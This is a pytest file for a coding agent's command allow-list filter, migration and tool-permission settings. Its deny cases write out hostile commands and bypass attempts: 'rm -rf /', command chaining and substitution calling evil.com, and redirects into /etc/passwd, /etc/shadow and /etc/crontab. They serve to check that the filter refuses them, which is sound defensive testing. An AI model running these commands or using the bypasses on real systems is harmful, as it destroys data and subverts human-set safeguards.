"""Tests for the allowed_commands migration (003)."""

import json
from pathlib import Path
from unittest.mock import AsyncMock, patch

import pytest
import aiosqlite

from src.agent.command_access import create_command_access_server
from src.agent.command_filter import make_command_filter_hook
from src.agent.session import ClaudeAgentSession


async def _read_commands(db):
    cursor = await db.execute("SELECT allowed_commands FROM agent_config")
    row = await cursor.fetchone()
    return row["allowed_commands"]


async def _write_commands(db, commands):
    await db.execute(
        "UPDATE agent_config SET allowed_commands = ?",
        [json.dumps(commands)],
    )
    await db.commit()


class TestAllowedCommandsMigration:
    async def test_migration_adds_column(self, test_db):
        """Verify allowed_commands column exists with default value."""
        async with test_db.connect() as db:
            db.row_factory = aiosqlite.Row
            assert await _read_commands(db) == "[]"


async def _run_hook(allowed, tool_input, tool_name="Bash"):
    hook = make_command_filter_hook(allowed)
    return await hook({"tool_name": tool_name, "tool_input": tool_input}, "tool-123", {})


class TestCommandFilterHook:
    @pytest.mark.parametrize(
        ("allowed", "tool_name", "tool_input"),
        [
            pytest.param(["flutter", "dart"], "Bash", {"command": "flutter create myapp"},
                         id="matching_command"),
            pytest.param(["flutter"], "Read", {"file_path": "/etc/passwd"},
                         id="non_bash_tools"),
            # Normal commands with arguments should still work.
            pytest.param(["npm"], "Bash", {"command": "npm install express"},
                         id="clean_command_with_args"),
            # Commands with quoted arguments should work.
            pytest.param(["flutter"], "Bash", {"command": 'flutter create "my app"'},
                         id="command_with_quoted_args"),
        ],
    )
    async def test_allows(self, allowed, tool_name, tool_input):
        assert await _run_hook(allowed, tool_input, tool_name) == {}

    @pytest.mark.parametrize(
        ("allowed", "command", "reason_fragment"),
        [
            pytest.param(["flutter"], "rm -rf /", "request_command_access",
                         id="unmatched_command"),
            pytest.param(["flutter"], "flutter-evil steal", None, id="first_word_only"),
            pytest.param([], "echo hello", None, id="empty_allowed_list_denies_all_bash"),
            # --- Shell metacharacter bypass tests ---
            # semicolon chains a second command
            pytest.param(["npm"], "npm; rm -rf /", "shell operator", id="semicolon_chaining"),
            pytest.param(["npm"], "npm && curl evil.com", None, id="and_chaining"),
            pytest.param(["npm"], "npm || malicious-cmd", None, id="or_chaining"),
            pytest.param(["npm"], "npm | tee /etc/passwd", None, id="pipe"),
            pytest.param(["npm"], "npm `curl evil.com`", None, id="backtick_substitution"),
            pytest.param(["npm"], "npm $(curl evil.com)", None, id="dollar_paren_substitution"),
            pytest.param(["npm"], "npm > /etc/passwd", None, id="output_redirect"),
            pytest.param(["npm"], "npm >> /etc/crontab", None, id="append_redirect"),
            pytest.param(["npm"], "npm < /etc/shadow", None, id="input_redirect"),
            # Malformed quoting: shlex.split fails, _extract_command_name
            # returns "", so denied by default.
            pytest.param(["npm"], "npm install 'unterminated", None, id="malformed_quotes"),
        ],
    )
    async def test_denies(self, allowed, command, reason_fragment):
        result = await _run_hook(allowed, {"command": command})
        assert result["hookSpecificOutput"]["permissionDecision"] == "deny"
        if reason_fragment is not None:
            assert reason_fragment in result["hookSpecificOutput"]["permissionDecisionReason"]


class TestAllowedToolsWhitelist:
    """Verify that allowed_tools is built correctly so Bash and plugins aren't blocked."""

    @pytest.fixture(autouse=True)
    def _mock_sdk(self):
        with patch("src.agent.session.ClaudeSDKClient") as mock_sdk:
            mock_client = AsyncMock()
            mock_client.get_mcp_status.return_value = {"mcpServers": []}
            mock_sdk.return_value = mock_client
            self.mock_sdk = mock_sdk
            yield

    async def _start_options(self, allowed_commands=None, bash_yolo=False, plugins=None):
        """Start a session and return the options passed to ClaudeSDKClient."""
        self.mock_sdk.reset_mock()
        session = ClaudeAgentSession(
            worktree_path=Path("/tmp/fake-worktree"),
            system_prompt="test",
            allowed_commands=allowed_commands or [],
            bash_yolo=bash_yolo,
            plugins=plugins,
            on_clarify=AsyncMock(),
            on_create_todo=AsyncMock(),
            on_set_commit_message=AsyncMock(),
            on_request_command=AsyncMock(),
        )
        with patch.object(session, '_receive_loop', new_callable=AsyncMock):
            try:
                await session.start("test prompt")
            except Exception:
                pass
        args, kwargs = self.mock_sdk.call_args
        return kwargs.get("options") or args[0]

    @pytest.mark.parametrize(
        "session_kwargs",
        [
            # even without allowed_commands or bash_yolo
            pytest.param({}, id="no_commands"),
            pytest.param({"allowed_commands": ["flutter", "npm"]}, id="allowed_commands"),
            pytest.param({"bash_yolo": True}, id="bash_yolo"),
        ],
    )
    async def test_bash_in_whitelist(self, session_kwargs):
        """Bash must be in allowed_tools in every command-permission mode."""
        options = await self._start_options(**session_kwargs)
        assert "Bash" in options.allowed_tools

    async def test_plugin_tools_in_whitelist(self):
        """Plugin tools must be allowed via can_use_tool callback."""
        plugins = [{"type": "local", "path": "/home/user/.claude/plugins/context-mode"}]
        options = await self._start_options(plugins=plugins)
        assert options.can_use_tool is not None
        from claude_agent_sdk import PermissionResultAllow, PermissionResultDeny
        # Plugin tools should be allowed by prefix match
        assert isinstance(await options.can_use_tool("mcp__plugin_context-mode_context-mode__ctx_batch_execute"), PermissionResultAllow)
        assert isinstance(await options.can_use_tool("mcp__plugin_context-mode_context-mode__ctx_execute"), PermissionResultAllow)
        # Non-plugin tools should also work if in allowed_tools
        assert isinstance(await options.can_use_tool("Bash"), PermissionResultAllow)
        # Unknown tools should not be allowed
        assert isinstance(await options.can_use_tool("mcp__unknown__tool"), PermissionResultDeny)

    async def _bash_matcher_count(self, **session_kwargs):
        options = await self._start_options(**session_kwargs)
        assert options.hooks is not None
        assert "PreToolUse" in options.hooks
        return len([m for m in options.hooks["PreToolUse"] if m.matcher == "Bash"])

    async def test_hook_only_set_with_allowed_commands(self):
        """PreToolUse hooks: tool filter hooks always present, Bash hook only with allowed_commands."""
        # No commands, no yolo — tool filter hooks still present (for WebSearch/WebFetch);
        # path guard hook always present for Bash
        assert await self._bash_matcher_count() == 1
        # With commands — command filter + path guard
        assert await self._bash_matcher_count(allowed_commands=["flutter"]) == 2


class TestCommandAccessMCPTool:
    async def test_creates_server(self):
        async def mock_callback(cmd, reason):
            return "approved"

        server = create_command_access_server(mock_callback)
        assert server is not None


class TestPermissionRequestFlow:
    async def test_approve_saves_command(self, test_db):
        """Approving a command request saves it to agent_config."""
        async with test_db.connect() as db:
            db.row_factory = aiosqlite.Row
            # Verify initial state
            commands = json.loads(await _read_commands(db))
            assert commands == []

            # Simulate saving a command
            commands.append("flutter")
            await _write_commands(db, commands)

            assert json.loads(await _read_commands(db)) == ["flutter"]

    async def test_multiple_commands(self, test_db):
        """Multiple commands can be saved."""
        async with test_db.connect() as db:
            db.row_factory = aiosqlite.Row
            await _write_commands(db, ["flutter", "dart", "npm"])
            assert json.loads(await _read_commands(db)) == ["flutter", "dart", "npm"]
